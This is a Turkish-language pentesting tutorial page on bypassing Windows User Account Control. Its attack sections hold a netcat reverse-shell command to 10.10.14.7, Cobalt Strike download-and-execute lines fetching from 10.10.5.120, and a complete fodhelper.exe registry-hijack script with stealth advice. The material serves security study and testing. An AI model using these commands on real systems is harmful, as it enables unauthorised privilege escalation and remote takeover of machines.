# UAC - Kullanıcı Hesap Denetimi

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bir uygulamadır ve **yükseltilmiş işlemler için onay istemi** sağlar. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviye** bir program sisteme **potansiyel olarak zarar verebilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, bir yönetici açıkça bu uygulama/görevlere yönetici düzeyinde erişim yetkisi vermedikçe uygulamalar ve görevler her zaman **bir yönetici olmayan hesabın güvenlik bağlamı altında** çalışır. Bu, yöneticileri istem dışı değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.

Daha fazla bilgi için integrity seviyeleri hakkında:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC etkin olduğunda, bir yönetici kullanıcıya 2 token verilir: normal işlemler için standart bir kullanıcı token'ı ve yönetici ayrıcalıkları içeren bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığını derinlemesine tartışır ve oturum açma süreci, kullanıcı deneyimi ve UAC mimarisini içerir. Yöneticiler, UAC'nin kuruluşlarına özel nasıl çalışacağını yerel düzeyde güvenlik ilkeleriyle (secpol.msc kullanarak) yapılandırabilir veya Active Directory alan ortamında Group Policy Objects (GPO) aracılığıyla dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak tartışılmaktadır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı vardır. Aşağıdaki tablo ek ayrıntı sağlar:

| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı                                                   |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı                                                   |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay istenir               |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik bilgileri istenir                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) / Devre Dışı (kurumsal için varsayılan) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                   |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                        |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                        |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                        |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                        |

### UAC Bypass Teorisi

Bazı programlar, kullanıcı **administrator grubuna aitse** **otomatik olarak yükseltilir (autoelevated)**. Bu ikili dosyaların içindeki _**Manifests**_ bölümünde _**autoElevate**_ seçeneği _**True**_ olarak ayarlanmıştır. İkili dosyanın ayrıca **Microsoft tarafından imzalanmış** olması gerekir.

Birçok auto-elevate süreci, medium integrity (normal kullanıcı düzeyi ayrıcalıklarıyla çalışan) süreçlerden çağrılabilen **COM objeleri veya RPC sunucuları aracılığıyla işlevsellik** sunar. COM (Component Object Model) ve RPC (Remote Procedure Call), Windows programlarının farklı süreçler arasında iletişim kurup fonksiyonları çalıştırmak için kullandığı yöntemlerdir. Örneğin, **`IFileOperation COM object`** dosya işlemlerini (kopyalama, silme, taşıma) ele almak üzere tasarlanmıştır ve uyarı göstermeden otomatik olarak ayrıcalıkları yükseltebilir.

Bazı kontrollerin, örneğin işlemin **System32 dizininden** çalıştırılıp çalıştırılmadığını kontrol etmesi gibi kontroller yapılabileceğini unutmayın; bu tür kontroller, örneğin **explorer.exe'ye enjeksiyon** yapmak veya System32 konumunda bulunan başka bir yürütülebilir dosyaya enjeksiyonla atlatılabilir.

Bu kontrolleri atlatmanın bir diğer yolu PEB'i **değiştirmektir**. Windows'taki her sürecin bir Process Environment Block (PEB) vardır; bu blok süreç hakkında yürütülebilir yol gibi önemli verileri içerir. PEB'i değiştirerek, saldırganlar kendi kötü amaçlı süreçlerinin konumunu sahte (spoof) şekilde gösterebilir ve sürecin güvenilir bir dizinden (ör. system32) çalışıyormuş gibi görünmesini sağlayabilir. Bu taklit edilmiş bilgi, COM objesini kullanıcıya sormadan otomatik olarak ayrıcalıkları yükseltmek için kandırır.

Daha sonra, UAC'yi **atlatmak (yani medium integrity seviyesinden high'a yükselmek)** için bazı saldırganlar bu tür ikilileri kullanarak **rastgele kod çalıştırır**, çünkü kod **High integrity** seviyesindeki bir süreçten çalıştırılacaktır.

Bir ikilinin _**Manifest**_'ini kontrol etmek için Sysinternals'tan _**sigcheck.exe**_ aracını kullanabilirsiniz. (`sigcheck.exe -m <file>`) Ve süreçlerin **integrity seviyesini** görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanabilirsiniz.

### UAC Kontrolü

UAC'nin etkin olup olmadığını doğrulamak için:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise UAC **etkinleştirilmiş**, eğer **`0`** ise veya mevcut değilse UAC **devre dışı**.

Sonra, **hangi seviyenin** yapılandırıldığını kontrol edin:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Eğer **`0`** ise, UAC uyarısı gelmez (yani **devre dışı**)
- Eğer **`1`** ise yöneticiye yüksek haklarla binary'yi çalıştırmak için **kullanıcı adı ve parola sorulur** (Secure Desktop üzerinde)
- Eğer **`2`** (**Always notify me**) yönetici yüksek ayrıcalıkla bir şey çalıştırmayı denediğinde UAC her zaman onay ister (Secure Desktop üzerinde)
- Eğer **`3`** `1` gibidir ama Secure Desktop gerekli değildir
- Eğer **`4`** `2` gibidir ama Secure Desktop gerekli değildir
- Eğer **`5`** (**varsayılan**) Windows olmayan binary'leri yüksek ayrıcalıklarla çalıştırmak için yöneticiden onay ister

Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız.\
Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcısı (yerleşik Yönetici) **UAC olmadan yönetici görevlerini** yerine getirebilir; eğer **`1`** ise, **"Administrators"** grubundaki tüm hesaplar bunu yapabilir.

Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın.\
Eğer **`0`** (varsayılan) ise, yerleşik Administrator hesabı uzak yönetim görevlerini yapabilir; eğer **`1`** ise yerleşik Administrator hesabı uzak yönetim görevlerini yapamaz, ancak `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmışsa yapabilir.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (yerleşik Yönetici)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

Tüm bu bilgiler **metasploit** modülü ile toplanabilir: `post/windows/gather/win_privs`

Ayrıca kullanıcı gruplarınızı kontrol edebilir ve integrity level'ınızı öğrenebilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Hedefin grafiksel arayüzüne erişiminiz varsa, UAC bypass çok basittir; UAC istemi göründüğünde sadece "Yes"e tıklayabilirsiniz

UAC bypass şu durumda gereklidir: **UAC etkin, işleminiz medium integrity context içinde çalışıyor ve kullanıcı hesabınız administrators grubuna ait**.

Belirtmek gerekir ki, **UAC en yüksek güvenlik seviyesindeyse (Always), diğer herhangi bir seviyedeyken (Default) olduğuna kıyasla atlatmak çok daha zordur.**

### UAC devre dışı

Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) şu gibi bir şey kullanarak (high integrity level) **admin privileges ile bir reverse shell çalıştırabilirsiniz:**
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok Temel** UAC "bypass" (full file system access)

Eğer Administrators grubunun içinde bir kullanıcıyla shell'e sahipseniz, SMB üzerinden paylaşılan **mount the C$**'ı yerel olarak yeni bir diske bağlayabilir ve file system içindeki her şeye **erişiminiz olur** (hatta Administrator home folder).

> [!WARNING]
> **Görünüşe göre bu hile artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass ile cobalt strike

Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik seviyesinde ayarlı değilse çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modüle sahiptir.

### KRBUACBypass

Dokümantasyon ve araç: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) birkaç UAC bypass exploits içeren bir **derlemedir**. Dikkat: **UACME'yi visual studio veya msbuild kullanarak derlemeniz gerekecek**. Derleme birkaç çalıştırılabilir dosya oluşturacaktır (ör. `Source\Akagi\outout\x64\Debug\Akagi.exe`), hangi dosyaya **ihtiyaç duyduğunuzu** bilmeniz gerekecek.\
**Dikkatli olun**, çünkü bazı bypass'lar bazı diğer programları **tetikleyebilir** ve bu programlar **kullanıcıyı** bir şeylerin olduğunu **uyarabilir**.

UACME, **her tekniğin hangi build sürümünden itibaren çalışmaya başladığını** gösterir. Sürümlerinizi etkileyen bir teknik arayabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilen ikili `fodhelper.exe` modern Windows sürümlerinde otomatik olarak yükseltilir. Başlatıldığında, `DelegateExecute` verbünü doğrulamadan aşağıdaki kullanıcıya özel kayıt defteri yolunu sorgular. Oraya bir komut yerleştirmek, bir Medium Integrity sürecinin (kullanıcı Administrators grubunda) UAC prompt olmadan bir High Integrity süreci başlatmasına olanak verir.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell adımları (payload'unuzu ayarlayın, sonra trigger edin):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notlar:
- Mevcut kullanıcı Administrators grubunun bir üyesi olduğunda ve UAC seviyesi varsayılan/esnek olduğunda işe yarar (Always Notify ile ek kısıtlamalar olduğunda çalışmaz).
- 64-bit Windows'ta 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut (PowerShell, cmd veya bir EXE yolu) olabilir. Stealth için uyarı gösteren UI'ları tetiklemekten kaçının.

#### Daha fazla UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUI ile UAC Bypass

Eğer bir **GUI** erişiminiz varsa, UAC istemini aldığınızda onu kabul edebilirsiniz; gerçekten bir bypass'a ihtiyacınız yoktur. Bu nedenle, GUI erişimi UAC'yi bypass etmenize izin verir.

Ayrıca, eğer birinin kullandığı (muhtemelen RDP ile) bir GUI session elde ederseniz, bazı araçlar administrator olarak çalışıyor olabilir; bu araçlardan örneğin bir **cmd**'yi doğrudan **as admin** olarak UAC tarafından tekrar sorulmadan çalıştırabilirsiniz, örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültülü olmaktan endişe etmiyorsanız, kullanıcı kabul edene kadar izinleri yükseltmeyi isteyen [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir aracı çalıştırabilirsiniz.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
